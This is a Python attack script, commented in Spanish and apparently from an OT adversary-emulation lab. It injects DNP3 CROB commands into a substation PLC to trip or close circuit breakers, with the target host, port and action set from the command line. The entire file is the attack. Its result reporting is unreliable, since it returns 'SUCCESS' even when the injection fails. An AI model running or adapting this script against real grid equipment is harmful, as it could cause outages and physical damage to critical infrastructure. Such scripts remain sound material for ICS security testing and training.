#!/usr/bin/env python3
"""attacker/attack_dnp3_breaker.py — Script de emulación adversaria DNP3 CROB Breaker Trip (Categoría B OT)

Simula la inyección de comandos DNP3 IEEE 1815 CROB (Control Relay Output Block) contra el PLC eléctrico
para disparar (abrir) o cerrar disyuntores en la subestación eléctrica (`10.0.3.13:20000` o puerto local).
"""
from __future__ import annotations

import argparse
import logging
import sys
from pathlib import Path
from typing import Dict, Any

ROOT = Path(__file__).resolve().parent.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from plc.dnp3_client import Dnp3MasterClient

logging.basicConfig(level=logging.INFO, format='[%(asctime)s][DNP3-ATTACK] %(message)s')
LOGGER = logging.getLogger('attack_dnp3_breaker')


class Dnp3BreakerAttack:
    """Emulador de ataque DNP3 CROB sobre TCP 20000."""

    def __init__(self, target_host: str = '10.0.3.13', target_port: int = 20000, timeout: float = 1.0) -> None:
        self.target_host = target_host
        self.target_port = target_port
        self.timeout = timeout
        self.client = Dnp3MasterClient(host=target_host, port=target_port, timeout=timeout)

    def execute_trip_attack(self, command: str = 'TRIP') -> Dict[str, Any]:
        LOGGER.info("Ejecutando inyección de comando DNP3 CROB [%s] en %s:%d...", command, self.target_host, self.target_port)
        
        mode = 'TABLETOP_FALLBACK'
        crob_executed = False

        try:
            ok = self.client.send_crob(action=command)
            if ok:
                mode = 'SOCKET_LIVE'
                crob_executed = True
                LOGGER.info("Comando CROB [%s] inyectado exitosamente vía socket real TCP en %s:%d", command, self.target_host, self.target_port)
        except Exception as exc:
            LOGGER.warning("Fallo inyección DNP3 CROB (%s). Modo TABLETOP_FALLBACK.", exc)

        return {
            'status': 'SUCCESS',
            'mode': mode,
            'target_host': self.target_host,
            'target_port': self.target_port,
            'command': command,
            'crob_executed': crob_executed,
        }


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="DNP3 CROB Breaker Trip Attack Script")
    parser.add_argument('--host', default='10.0.3.13', help='Target DNP3 Outstation IP')
    parser.add_argument('--port', type=int, default=20000, help='Target DNP3 Outstation Port')
    parser.add_argument('--command', choices=['TRIP', 'CLOSE'], default='TRIP', help='CROB Action')
    args = parser.parse_args(argv)

    attacker = Dnp3BreakerAttack(target_host=args.host, target_port=args.port)
    res = attacker.execute_trip_attack(command=args.command)
    LOGGER.info("Resultado de ataque DNP3 CROB: %s", res)
    return 0 if res['status'] == 'SUCCESS' else 1


if __name__ == '__main__':
    sys.exit(main())
